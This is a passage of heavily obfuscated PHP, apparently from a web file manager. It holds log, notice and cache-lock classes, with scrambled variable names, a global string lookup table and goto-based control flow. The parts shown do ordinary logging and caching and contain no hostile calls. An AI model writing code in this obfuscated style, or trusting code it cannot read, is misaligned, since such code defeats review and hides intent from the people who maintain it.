LNG($fÇ¡›íåùñ[2421]), $fÇ¡›íåùñ[2422] => LNG($fÇ¡›íåùñ[2423]), $fÇ¡›íåùñ[2424] => LNG($fÇ¡›íåùñ[2425])); } private function typeFile() { $B½Ñ“£ÛÍé =& $_SERVER[Ö]; $Aİ”Ûğƒ = array($B½Ñ“£ÛÍé[2052] => array($B½Ñ“£ÛÍé[2053]), $B½Ñ“£ÛÍé[2370] => array($B½Ñ“£ÛÍé[2426]), $B½Ñ“£ÛÍé[2372] => array($B½Ñ“£ÛÍé[2427]), $B½Ñ“£ÛÍé[2046] => array($B½Ñ“£ÛÍé[2047]), $B½Ñ“£ÛÍé[2378] => array(), $B½Ñ“£ÛÍé[2380] => array(), $B½Ñ“£ÛÍé[2382] => array(), $B½Ñ“£ÛÍé[2055] => array($B½Ñ“£ÛÍé[2057]), $B½Ñ“£ÛÍé[2056] => array($B½Ñ“£ÛÍé[2057]), $B½Ñ“£ÛÍé[2386] => array($B½Ñ“£ÛÍé[2428]), $B½Ñ“£ÛÍé[2388] => array($B½Ñ“£ÛÍé[2428]), $B½Ñ“£ÛÍé[2390] => array($B½Ñ“£ÛÍé[2429]), $B½Ñ“£ÛÍé[2376] => array($B½Ñ“£ÛÍé[2430]), $B½Ñ“£ÛÍé[2392] => array($B½Ñ“£ÛÍé[2431]), $B½Ñ“£ÛÍé[2394] => array($B½Ñ“£ÛÍé[2432]), $B½Ñ“£ÛÍé[2050] => array($B½Ñ“£ÛÍé[2051])); return $Aİ”Ûğƒ; } private function typeAll() { goto fë°èù÷õù; f‰§©«¶: foreach ($FÁçÇ íÎî as $Cë÷æäÊ => $F¢ŒåÔ»¦) { $BèĞÎ©Û…‚[$F¢ŒåÔ»¦[0]] = $BèĞÎ©Û…‚[$Cë÷æäÊ]; } $BèĞÎ©Û…‚[$c¿”‡š©[2057]] = LNG($c¿”‡š©[2433]); $BèĞÎ©Û…‚[$c¿”‡š©[2428]] = LNG($c¿”‡š©[2434]); goto A­ô ˆÍ†¬; A­ô ˆÍ†¬: return $BèĞÎ©Û…‚; goto BÇ“’¦Ô±Ï; fë°èù÷õù: $c¿”‡š© =& $_SERVER[Ö]; $BèĞÎ©Û…‚ = $this->typeList; $FÁçÇ íÎî = array_filter($this->typeFile()); goto f‰§©«¶; BÇ“’¦Ô±Ï: } public function addLog($A¬¸¾¼Ÿ¢Ö, $f»½¶õ™àÊ = array()) { goto c¸„ñ„™½î; bºÕ„ÃÓŠ: parent::add($f»½¶õ™àÊ); goto dÛßÌ£ŠÜ; CĞ•ãÍ“îÜ: $EŸˆ¿‹ìù = get_client_ip(); if (!$f»½¶õ™àÊ || strlen(json_encode($f»½¶õ™àÊ)) >= 1024) { $f»½¶õ™àÊ = array($F–Ÿ¾íˆ‘ [2435] => $EŸˆ¿‹ìù); } else { if (is_array($f»½¶õ™àÊ)) { $f»½¶õ™àÊ[$F–Ÿ¾íˆ‘ [2435]] = $EŸˆ¿‹ìù; } else { $f»½¶õ™àÊ = array($F–Ÿ¾íˆ‘ [1027] => $f»½¶õ™àÊ, $F–Ÿ¾íˆ‘ [2435] => $EŸˆ¿‹ìù); } } $f»½¶õ™àÊ = array($F–Ÿ¾íˆ‘ [1404] => Session::sign(), $F–Ÿ¾íˆ‘ [1405] => $CÇ†õ”‘Ú‡, $F–Ÿ¾íˆ‘ [29] => $A¬¸¾¼Ÿ¢Ö, $F–Ÿ¾íˆ‘ [1407] => json_encode($f»½¶õ™àÊ)); goto bºÕ„ÃÓŠ; c¸„ñ„™½î: $F–Ÿ¾íˆ‘  =& $_SERVER[Ö]; if (!isset($this->typeList[$A¬¸¾¼Ÿ¢Ö])) { return; } $CÇ†õ”‘Ú‡ = USER_ID ? USER_ID : (isset($f»½¶õ™àÊ[$F–Ÿ¾íˆ‘ [1414]]) ? $f»½¶õ™àÊ[$F–Ÿ¾íˆ‘ [1414]] : 0); goto CĞ•ãÍ“îÜ; dÛßÌ£ŠÜ: } public function remove($Eß··‚Ù«) { $this->where(array($_SERVER[Ö][381] => $Eß··‚Ù«))->delete(); } private function _makeOrder($fÓğÕøéã = '') { goto A‹ºÔ—Î; A‹ºÔ—Î: $eÑÓÉ’Ùë§ =& $_SERVER[Ö]; $EáÂ…§ğç˜ = $eÑÓÉ’Ùë§[183]; $a„Šªæ–íÊ = array($eÑÓÉ’Ùë§[398] => $eÑÓÉ’Ùë§[399], $eÑÓÉ’Ùë§[400] => $eÑÓÉ’Ùë§[401]); goto f÷Û£é®©‘; B¬º…±È•›: return $this->order($fÓğÕøéã); goto C¬õ¨¢šŞ; f÷Û£é®©‘: $EÑÏ³‚‹”† = Input::get($eÑÓÉ’Ùë§[404], $eÑÓÉ’Ùë§[7], $eÑÓÉ’Ùë§[2215], array($eÑÓÉ’Ùë§[2152], $eÑÓÉ’Ùë§[400])); $EÑÏ³‚‹”† = $a„Šªæ–íÊ[$EÑÏ³‚‹”†]; $fÓğÕøéã = $fÓğÕøéã . "{$EáÂ…§ğç˜}\40{$EÑÏ³‚‹”†}"; goto B¬º…±È•›; C¬õ¨¢šŞ: } public function get($f°ó‚¼¤šœ = '') { goto EÄæôİ•Ñ²; aôÅõ‰Ÿäñ: if (!empty($f°ó‚¼¤šœ[$BÄ›Ïë¸ªÄ[2435]])) { $DË¡’§ä[$BÄ›Ïë¸ªÄ[401]] = array($BÄ›Ïë¸ªÄ[744], "\45{$f°ó‚¼¤šœ[$BÄ›Ïë¸ªÄ[2435]]}\x25"); } $BÇ­½¾Ò‘ = $this->_makeOrder()->where($DË¡’§ä)->selectPage(); if (empty($BÇ­½¾Ò‘[$BÄ›Ïë¸ªÄ[350]])) { show_json(array(), !0, $BÇ­½¾Ò‘[$BÄ›Ïë¸ªÄ[347]]); } goto Eâ’Õî½ğ; EÄæôİ•Ñ²: $BÄ›Ïë¸ªÄ =& $_SERVER[Ö]; if (!$f°ó‚¼¤šœ) { show_json(array()); } $DË¡’§ä = array(); goto bÃ½ğé‡—Ü; Eâ’Õî½ğ: $BÇ­½¾Ò‘[$BÄ›Ïë¸ªÄ[350]] = $this->logList($BÇ­½¾Ò‘[$BÄ›Ïë¸ªÄ[350]]); return $BÇ­½¾Ò‘; goto CßˆÎºŞ; bÃ½ğé‡—Ü: if ($f°ó‚¼¤šœ[$BÄ›Ïë¸ªÄ[1414]]) { $DË¡’§ä[$BÄ›Ïë¸ªÄ[1414]] = $f°ó‚¼¤šœ[$BÄ›Ïë¸ªÄ[1414]]; } if (isset($f°ó‚¼¤šœ[$BÄ›Ïë¸ªÄ[695]])) { $b®ç·ˆ£˜ø = $f°ó‚¼¤šœ[$BÄ›Ïë¸ªÄ[695]]; $c˜“Ñ‹ÖÆ« = isset($f°ó‚¼¤šœ[$BÄ›Ïë¸ªÄ[696]]) ? $f°ó‚¼¤šœ[$BÄ›Ïë¸ªÄ[696]] : time(); $DË¡’§ä[$BÄ›Ïë¸ªÄ[183]] = array($BÄ›Ïë¸ªÄ[317], array($b®ç·ˆ£˜ø, $c˜“Ñ‹ÖÆ«)); } if ($f°ó‚¼¤šœ[$BÄ›Ïë¸ªÄ[29]]) { $d’á–æñÈ’ = explode($BÄ›Ïë¸ªÄ[47], $f°ó‚¼¤šœ[$BÄ›Ïë¸ªÄ[29]]); $B©ßÁÈ‰Øœ = $this->typeFile(); $b­àÒ”ƒˆƒ = array(); foreach ($d’á–æñÈ’ as $f‚Ì­ŸªÓÅ) { $b­àÒ”ƒˆƒ[] = $f‚Ì­ŸªÓÅ; if (isset($B©ßÁÈ‰Øœ[$f‚Ì­ŸªÓÅ])) { $b­àÒ”ƒˆƒ = array_merge($b­àÒ”ƒˆƒ, $B©ßÁÈ‰Øœ[$f‚Ì­ŸªÓÅ]); } } $b­àÒ”ƒˆƒ = array_unique($b­àÒ”ƒˆƒ); if ($b­àÒ”ƒˆƒ) { $DË¡’§ä[$BÄ›Ïë¸ªÄ[29]] = array($BÄ›Ïë¸ªÄ[7], $b­àÒ”ƒˆƒ); } } goto aôÅõ‰Ÿäñ; CßˆÎºŞ: } private function ipAddress(&$C‘×‚‹Îè¯) { $cğ¶ªáÒ“é =& $_SERVER[Ö]; if (!empty($C‘×‚‹Îè¯[$cğ¶ªáÒ“é[2435]])) { $c¾®ô‰Ú¦ = IpLocation::get($C‘×‚‹Îè¯[$cğ¶ªáÒ“é[2435]]); if ($c¾®ô‰Ú¦ == $cğ¶ªáÒ“é[2436]) { $c¾®ô‰Ú¦ = $cğ¶ªáÒ“é[2437]; } } else { $c¾®ô‰Ú¦ = LNG($cğ¶ªáÒ“é[2438]); } $C‘×‚‹Îè¯[$cğ¶ªáÒ“é[2439]] = $c¾®ô‰Ú¦; } private function descZipDownload($fÏ‡“óßˆ, &$C¨µ‚“ø±) { $cÙæ ù¿Ší =& $_SERVER[Ö]; if (!isset($fÏ‡“óßˆ[$cÙæ ù¿Ší[2440]])) { return; } $e­ÉãÂ™ª = json_decode($fÏ‡“óßˆ[$cÙæ ù¿Ší[2440]], !0); foreach ($e­ÉãÂ™ª as $FƒÔç‡‚õ°) { if (!IO::init($FƒÔç‡‚õ°[$cÙæ ù¿Ší[75]])) { continue; } if (!($c¹§ÂÔ´ÔÙ = IO::infoFull($FƒÔç‡‚õ°[$cÙæ ù¿Ší[75]]))) { continue; } $fÏ‡“óßˆ[$cÙæ ù¿Ší[75]] = $FƒÔç‡‚õ°[$cÙæ ù¿Ší[75]]; $C¨µ‚“ø±[] = $fÏ‡“óßˆ[$cÙæ ù¿Ší[365]] = $c¹§ÂÔ´ÔÙ[$cÙæ ù¿Ší[365]]; $C¨µ‚“ø±[] = $fÏ‡“óßˆ[$cÙæ ù¿Ší[2256]] = $c¹§ÂÔ´ÔÙ[$cÙæ ù¿Ší[457]]; break; } return $fÏ‡“óßˆ; } private function getSourceList(&$f³ƒß˜³) { $BìÕáµÏ†³ =& $_SERVER[Ö]; $e»­ó¸ƒ÷Á = array(); foreach ($f³ƒß˜³ as $Eå·àß¶âè => $B…¤¢ğñ) { goto Cìí¸„‹Öä; aòºÈß†ĞÎ: $e»­ó¸ƒ÷Á[] = $b°·ƒßìÀ†[$BìÕáµÏ†³[365]]; $e»­ó¸ƒ÷Á[] = $b°·ƒßìÀ†[$BìÕáµÏ†³[2256]]; if ($b°·ƒßìÀ†[$BìÕáµÏ†³[29]] == $BìÕáµÏ†³[488]) { $e»­ó¸ƒ÷Á[] = $b°·ƒßìÀ†[$BìÕáµÏ†³[401]][$BìÕáµÏ†³[999]]; $e»­ó¸ƒ÷Á[] = $b°·ƒßìÀ†[$BìÕáµÏ†³[401]][$BìÕáµÏ†³[1000]]; } goto eÁóîÀå¶; Cìí¸„‹Öä: $b°·ƒßìÀ† = json_decode($B…¤¢ğñ[$BìÕáµÏ†³[401]], !0); if ($B…¤¢ğñ[$BìÕáµÏ†³[29]] == $BìÕáµÏ†³[2049]) { $b°·ƒßìÀ† = $this->descZipDownload($b°·ƒßìÀ†, $e»­ó¸ƒ÷Á); $f³ƒß˜³[$Eå·àß¶âè][$BìÕáµÏ†³[401]] = json_encode($b°·ƒßìÀ†); continue; } if (strpos($B…¤¢ğñ[$BìÕáµÏ†³[29]], $BìÕáµÏ†³[2257]) !== 0) { goto c¿”ô™°Ëø; c¿”ô™°Ëø: if (!isset($b°·ƒßìÀ†[$BìÕáµÏ†³[75]]) || strpos($B…¤¢ğñ[$BìÕáµÏ†³[29]], $BìÕáµÏ†³[2441]) !== 0) { continue; } if (!IO::init($b°·ƒßìÀ†[$BìÕáµÏ†³[75]])) { continue; } if (!($bàò×šÕ‘Ì = IO::infoFull($b°·ƒßìÀ†[$BìÕáµÏ†³[75]]))) { continue; } goto eÀ­·¡£ãÑ; d­³­‡Š: continue; goto d×ö×àß½ö; eÀ­·¡£ãÑ: $e»­ó¸ƒ÷Á[] = $b°·ƒßìÀ†[$BìÕáµÏ†³[365]] = $bàò×šÕ‘Ì[$BìÕáµÏ†³[365]]; $e»­ó¸ƒ÷Á[] = $b°·ƒßìÀ†[$BìÕáµÏ†³[2256]] = $bàò×šÕ‘Ì[$BìÕáµÏ†³[457]]; $f³ƒß˜³[$Eå·àß¶âè][$BìÕáµÏ†³[401]] = json_encode($b°·ƒßìÀ†); goto d­³­‡Š; d×ö×àß½ö: } goto aòºÈß†ĞÎ; eÁóîÀå¶: if ($b°·ƒßìÀ†[$BìÕáµÏ†³[29]] == $BìÕáµÏ†³[2264]) { $e»­ó¸ƒ÷Á[] = $b°·ƒßìÀ†[$BìÕáµÏ†³[401]][$BìÕáµÏ†³[365]]; } goto B»¼íÏ‰¤‹; B»¼íÏ‰¤‹: } if (!$e»­ó¸ƒ÷Á) { return array(); } return Model($BìÕáµÏ†³[745])->sourceListInfo($e»­ó¸ƒ÷Á, !0); } private function logList($DÅµÀˆ˜â) { goto eÀöİï¹ôî; a™Û£—–: return $D´ÚóáŒ÷È; goto AĞ‡óíÔ‡¬; eÀöİï¹ôî: $DÇêÆ½ƒÈŒ =& $_SERVER[Ö]; $d•„¡ÌèÅœ = array_to_keyvalue($DÅµÀˆ˜â, $DÇêÆ½ƒÈŒ[33], $DÇêÆ½ƒÈŒ[1414]); $Fø¨àî”Í‚ = Model($DÇêÆ½ƒÈŒ[473])->userListInfo(array_unique($d•„¡ÌèÅœ)); goto fŒ†Ä²Ùåğ; Cäö£Ñ ËÊ: $Eø‹ÄÆÄ¾š = array(); foreach ($DÅµÀˆ˜â as $DéÆí™ßï => $A°ğ’°ù¡Ü) { goto f©Ş¡·’‹; f°Üïô˜Ğ: $A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[28]] = isset($f‘ˆ¢İç•Ã[$DÇêÆ½ƒÈŒ[28]]) ? $f‘ˆ¢İç•Ã[$DÇêÆ½ƒÈŒ[28]] : LNG($DÇêÆ½ƒÈŒ[2438]); $A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[2304]] = isset($f‘ˆ¢İç•Ã[$DÇêÆ½ƒÈŒ[2304]]) ? $f‘ˆ¢İç•Ã[$DÇêÆ½ƒÈŒ[2304]] : $DÇêÆ½ƒÈŒ[33]; $A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[1320]] = isset($aÙ‡›ë°è‹[$b¥©ùïî‘¥]) ? $aÙ‡›ë°è‹[$b¥©ùïî‘¥] : $eç«ëË«²; goto e‡ÄöÔ•Ì¨; f©Ş¡·’‹: $b¥©ùïî‘¥ = $A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[29]]; $f‘ˆ¢İç•Ã = isset($Fø¨àî”Í‚[$A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[1414]]]) ? $Fø¨àî”Í‚[$A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[1414]]] : !1; $eç«ëË«² = strpos($b¥©ùïî‘¥, $DÇêÆ½ƒÈŒ[2442]) === 0 ? LNG($DÇêÆ½ƒÈŒ[2443]) : LNG($DÇêÆ½ƒÈŒ[2438]); goto f°Üïô˜Ğ; EÁÜ¼„Šœë: $this->ipAddress($A°ğ’°ù¡Ü); if (strpos($b¥©ùïî‘¥, $DÇêÆ½ƒÈŒ[2257]) === 0 || isset($E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[2256]])) { goto bßæ¤ö‰°¡; bßæ¤ö‰°¡: $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[387]] = $A©Ÿ”Ÿ’™[$E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[365]]]; $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[2269]] = $A©Ÿ”Ÿ’™[$E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[2256]]]; if ($E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[29]] == $DÇêÆ½ƒÈŒ[488]) { $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[401]][$DÇêÆ½ƒÈŒ[999]] = $A©Ÿ”Ÿ’™[$E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[401]][$DÇêÆ½ƒÈŒ[999]]]; $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[401]][$DÇêÆ½ƒÈŒ[1000]] = $A©Ÿ”Ÿ’™[$E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[401]][$DÇêÆ½ƒÈŒ[1000]]]; } goto dÙ†‹°³Ì´; EàÚ‰‘ÀÃò: if ($E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[2269]] && $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[2269]][$DÇêÆ½ƒÈŒ[367]] == $DÇêÆ½ƒÈŒ[1073]) { $Eø‹ÄÆÄ¾š[] = $A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[363]]; unset($DÅµÀˆ˜â[$DéÆí™ßï]); continue; } goto dÄ®°´´å§; dÙ†‹°³Ì´: if ($E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[29]] == $DÇêÆ½ƒÈŒ[2264]) { $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[401]][$DÇêÆ½ƒÈŒ[365]] = $A©Ÿ”Ÿ’™[$E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[401]][$DÇêÆ½ƒÈŒ[365]]]; } if ($E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[29]] == $DÇêÆ½ƒÈŒ[2044]) { $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[2269]] = $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[387]]; $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[2256]] = $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[2269]][$DÇêÆ½ƒÈŒ[365]]; $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[387]] = !1; $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[365]] = $DÇêÆ½ƒÈŒ[33]; } if ($E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[387]] && $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[387]][$DÇêÆ½ƒÈŒ[367]] == $DÇêÆ½ƒÈŒ[1073]) { $Eø‹ÄÆÄ¾š[] = $A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[363]]; unset($DÅµÀˆ˜â[$DéÆí™ßï]); continue; } goto EàÚ‰‘ÀÃò; dÄ®°´´å§: } $A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[401]] = $E…‹ŒæĞØß; goto Aà¨Ü‘ßï; e‡ÄöÔ•Ì¨: $A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[2214]] = $f‘ˆ¢İç•Ã; $E…‹ŒæĞØß = json_decode($A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[401]], !0); $A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[2435]] = isset($E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[2435]]) ? $E…‹ŒæĞØß[$DÇêÆ½ƒÈŒ[2435]] : $DÇêÆ½ƒÈŒ[33]; goto EÁÜ¼„Šœë; Aà¨Ü‘ßï: unset($A°ğ’°ù¡Ü[$DÇêÆ½ƒÈŒ[2444]]); $D´ÚóáŒ÷È[] = $A°ğ’°ù¡Ü; goto fÃÃ«Ì†íÄ; fÃÃ«Ì†íÄ: } $this->clearSystemPathLog($Eø‹ÄÆÄ¾š); goto a™Û£—–; fŒ†Ä²Ùåğ: $A©Ÿ”Ÿ’™ = $this->getSourceList($DÅµÀˆ˜â); $aÙ‡›ë°è‹ = $this->typeAll(); $D´ÚóáŒ÷È = array(); goto Cäö£Ñ ËÊ; AĞ‡óíÔ‡¬: } private function clearSystemPathLog($DÂ‚ÑåŸª) { $c°ã™œÕ›Ô =& $_SERVER[Ö]; if (count($DÂ‚ÑåŸª) == 0) { return; } $FËîˆÉ¾… = array($c°ã™œÕ›Ô[363] => array($c°ã™œÕ›Ô[7], array_unique($DÂ‚ÑåŸª))); $this->where($FËîˆÉ¾…)->delete(); } public function deviceList($E¯‡«ÔÕºí, $b…ƒ°ä¼œ× = 0) { $a¹„‡¿æ—ˆ =& $_SERVER[Ö]; $fñğ»¼Œ © = array($a¹„‡¿æ—ˆ[1414] => $E¯‡«ÔÕºí, $a¹„‡¿æ—ˆ[183] => array($a¹„‡¿æ—ˆ[923], $b…ƒ°ä¼œ×), $a¹„‡¿æ—ˆ[29] => $a¹„‡¿æ—ˆ[2017]); $c‘¢áÛÒİÍ = array(); $bá”Â®ƒ¼ = $this->field($a¹„‡¿æ—ˆ[2445])->where($fñğ»¼Œ ©)->order($a¹„‡¿æ—ˆ[2267])->limit(50)->select(); foreach ($bá”Â®ƒ¼ as $Bƒ®Õãˆå‚ => $f„¤Ë¬”†) { goto dĞë“É©Ñ‰; a’ÈƒôèÖ­: $this->ipAddress($f„¤Ë¬”†); $f„¤Ë¬”†[$a¹„‡¿æ—ˆ[401]] = $Cµğê§Áì±; $c‘¢áÛÒİÍ[$DŞÓÊøùÓ] = $f„¤Ë¬”†; goto Dˆß¢‰Áª…; F¥™„ØéÎî: unset($Cµğê§Áì±[$a¹„‡¿æ—ˆ[2435]]); $DŞÓÊøùÓ = $this->deviceType($Cµğê§Áì±[$a¹„‡¿æ—ˆ[2258]]); if (isset($c‘¢áÛÒİÍ[$DŞÓÊøùÓ])) { continue; } goto a’ÈƒôèÖ­; dĞë“É©Ñ‰: if ($Bƒ®Õãˆå‚ > 0 && abs($f„¤Ë¬”†[$a¹„‡¿æ—ˆ[183]] - $bá”Â®ƒ¼[$Bƒ®Õãˆå‚ - 1][$a¹„‡¿æ—ˆ[183]]) < 5) { continue; } $Cµğê§Áì± = json_decode($f„¤Ë¬”†[$a¹„‡¿æ—ˆ[401]], !0); $f„¤Ë¬”†[$a¹„‡¿æ—ˆ[2435]] = isset($Cµğê§Áì±[$a¹„‡¿æ—ˆ[2435]]) ? $Cµğê§Áì±[$a¹„‡¿æ—ˆ[2435]] : $a¹„‡¿æ—ˆ[33]; goto F¥™„ØéÎî; Dˆß¢‰Áª…: } return array_values($c‘¢áÛÒİÍ); } public function deviceType($D‚ˆ¢é…ì) { return $D‚ˆ¢é…ì; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\x2e\x6e\x6f\x74\151\x63\x65\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x63\157\x6e\x74\x65\156\164", "\141\x75\x74\x68", "\x6d\157\x64\145", "\164\151\155\x65", "\164\x79\160\x65", "\x6c\x65\x76\x65\154", "\145\x6e\x61\x62\154\x65", "\x73\157\x72\x74"); public function listData($dÁŠÒÄ™ßà = false, $BÜ¿ôàƒ„Ê = "\x73\157\162\164", $F•Àöñì–ï = false) { return parent::listData($dÁŠÒÄ™ßà, $BÜ¿ôàƒ„Ê, $F•Àöñì–ï); } public function add($b«– ô¬) { $Eõ’²ÕÁ¶© =& $_SERVER[Ö]; $D¤è™Õª”ê = time(); if ($b«– ô¬[$Eõ’²ÕÁ¶©[12]] == $Eõ’²ÕÁ¶©[2446]) { $D¤è™Õª”ê = strtotime($b«– ô¬[$Eõ’²ÕÁ¶©[186]]); } $b«– ô¬[$Eõ’²ÕÁ¶©[186]] = $D¤è™Õª”ê; return parent::insert($b«– ô¬); } public function update($Fêâ¦ôã÷Š, $dŸ†ÙÜˆÆ) { goto aìÖò—Ù; CãÅÜŠõ¤‚: $a“ÖÀ›Äš = time(); if ($dŸ†ÙÜˆÆ[$Còö­ƒ¤¯Ê[12]] == $Còö­ƒ¤¯Ê[2446]) { $a“ÖÀ›Äš = strtotime($dŸ†ÙÜˆÆ[$Còö­ƒ¤¯Ê[186]]); } $dŸ†ÙÜˆÆ[$Còö­ƒ¤¯Ê[186]] = $a“ÖÀ›Äš; goto BÑ¤ä’‘ªñ; BÑ¤ä’‘ªñ: return parent::update($Fêâ¦ôã÷Š, $dŸ†ÙÜˆÆ); goto FÑÊÉ‡Êº¢; aìÖò—Ù: $Còö­ƒ¤¯Ê =& $_SERVER[Ö]; $DÓğß‰í­× = $this->listData($Fêâ¦ôã÷Š); if (!$DÓğß‰í­×) { return !1; } goto CãÅÜŠõ¤‚; FÑÊÉ‡Êº¢: } public function remove($aÏ•®´Â„) { $B¯±˜²»Ù´ = $this->listData($aÏ•®´Â„); if (!$B¯±˜²»Ù´ || $B¯±˜²»Ù´[$_SERVER[Ö][1073]]) { return !1; } return parent::remove($aÏ•®´Â„); } public function sort($a÷í¹°ÌØ„, $Eä°“» Å) { return parent::update($a÷í¹°ÌØ„, $Eä°“» Å); } public function enable($c¹„‹©ùœ¢, $a¤·éÂôÅ) { return parent::update($c¹„‹©ùœ¢, array($_SERVER[Ö][2447] => $a¤·éÂôÅ)); } private function initUserOption() { $fâ®õöò¶› =& $_SERVER[Ö]; $this->optionType = $fâ®õöò¶›[2448]; $this->modelType = $fâ®õöò¶›[2449]; $this->field = array($fâ®õöò¶›[2450], $fâ®õöò¶›[28], $fâ®õöò¶›[186], $fâ®õöò¶›[29], $fâ®õöò¶›[2451], $fâ®õöò¶›[682], $fâ®õöò¶›[179]); } public function userNoticeGet($B”Ïİ¼´Ü = false) { $this->initUserOption(); return parent::listData($B”Ïİ¼´Ü, $_SERVER[Ö][363], !0); } public function userNoticeAdd($fê’àÍ‚¥) { $c‘Ñ’ËÓÃß =& $_SERVER[Ö]; $this->initUserOption(); $e¤ªßÍ·Ó² = $this->findByKey($c‘Ñ’ËÓÃß[2450], $fê’àÍ‚¥[$c‘Ñ’ËÓÃß[363]]); if ($e¤ªßÍ·Ó²) { return !0; } $BªåÈ°¨Ú = array($c‘Ñ’ËÓÃß[2450] => $fê’àÍ‚¥[$c‘Ñ’ËÓÃß[363]], $c‘Ñ’ËÓÃß[28] => $fê’àÍ‚¥[$c‘Ñ’ËÓÃß[28]], $c‘Ñ’ËÓÃß[186] => $fê’àÍ‚¥[$c‘Ñ’ËÓÃß[186]], $c‘Ñ’ËÓÃß[29] => isset($fê’àÍ‚¥[$c‘Ñ’ËÓÃß[29]]) ? $fê’àÍ‚¥[$c‘Ñ’ËÓÃß[29]] : 1, $c‘Ñ’ËÓÃß[2451] => isset($fê’àÍ‚¥[$c‘Ñ’ËÓÃß[2451]]) ? $fê’àÍ‚¥[$c‘Ñ’ËÓÃß[2451]] : 0, $c‘Ñ’ËÓÃß[682] => 0, $c‘Ñ’ËÓÃß[179] => 0); return parent::insert($BªåÈ°¨Ú); } public function userNoticeEdit($D£¹¶‹…Ô, $D—ğƒ†Œ„) { $this->initUserOption(); return parent::update($D£¹¶‹…Ô, $D—ğƒ†Œ„); } } goto EÒì½áÂÇé; Dò™•Ïİİ: class CacheLockMemcached { public function lock($BŸ´é¢—äî, $E‘ºİ«ˆÚ» = 0) { $C»ßçÕõñù = Cache::init(); $B²´ÆÕØ‹ø = microtime(!0) + $E‘ºİ«ˆÚ»; while (microtime(!0) < $B²´ÆÕØ‹ø) { $FâÓÆºÍ©” = $C»ßçÕõñù->get($BŸ´é¢—äî); if (!$FâÓÆºÍ©” || $FâÓÆºÍ©” < microtime(!0)) { $F±ÃÔµßê = $C»ßçÕõñù->handle->add($BŸ´é¢—äî, $B²´ÆÕØ‹ø, $E‘ºİ«ˆÚ»); if ($F±ÃÔµßê) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($eÛ„‘ßà† ) { return Cache::init()->get($eÛ„‘ßà† ); } public function unlock($fêÚ©Ù¯ñ) { return Cache::init()->remove($fêÚ©Ù¯ñ); } } class CacheLockDatabase { public function lock($C°ÅŞÛà´°, $d©èŞ ˜ê = 0) { $f†Ò¼¢¦İë = Model($_SERVER[Ö][748]); $D¿¤­ËË´ = microtime(!0) + $d©èŞ ˜ê; while (microtime(!0) < $D¿¤­ËË´) { $aÅ§ç±ÍŠğ = $f†Ò¼¢¦İë->get($C°ÅŞÛà´°); if (!$aÅ§ç±ÍŠğ || $aÅ§ç±ÍŠğ < microtime(!0)) { $A’©Ş¦ßÃÃ = $f†Ò¼¢¦İë->set($C°ÅŞÛà´°, $D¿¤­ËË´); if ($A’©Ş¦ßÃÃ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($e— ñ”ãå) { return Model($_SERVER[Ö][748])->get($e— ñ”ãå); } public function unlock($c°Şöùçø¥) { Model($_SERVER[Ö][748])->remove($c°Şöùçø¥); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($b§ËÎ¶¿Š¼, $d¤à¿îöÀĞ) { $cˆª®¼“†„ =& $_SERVER[Ö]; if (!class_exists($cˆª®¼“†„[777])) { show_json($cˆª®¼“†„[778], !1); } $this->cacheTime = $d¤à¿îöÀĞ; $this->handle = new Memcached(); if (is_array($b§ËÎ¶¿Š¼[$cˆª®¼“†„[779]]) && count($b§ËÎ¶¿Š¼[$cˆª®¼“†„[779]]) >= 1) { foreach ($b§ËÎ¶¿Š¼[$cˆª®¼“†„[779]] as $FòÖ†¤µ¹) { $eÇö·•ë¦Ê = explode($cˆª®¼“†„[4], $FòÖ†¤µ¹); $this->handle->addServer($eÇö·•ë¦Ê[0], $eÇö·•ë¦Ê[1]); } } else { $this->handle->addServer($b§ËÎ¶¿Š¼[$cˆª®¼“†„[165]], $b§ËÎ¶¿Š¼[$cˆª®¼“†„[166]]); } } public function set($f ²«Ûó¨, $bÄ„ìîª™, $cİ­œˆè¼ = false) { $cİ­œˆè¼ = $cİ­œˆè¼ ? $cİ­œˆè¼ : $this->cacheTime; return $this->handle->set($f ²«Ûó¨, $bÄ„ìîª™, $cİ­œˆè¼); } public function get($d‘åƒ¥‚Ş) { return $this->handle->get($d‘åƒ¥‚Ş); } public function remove($Eëªƒ¦«È) { return $this->handle->delete($Eëªƒ¦«È); } public function deleteAll() { return 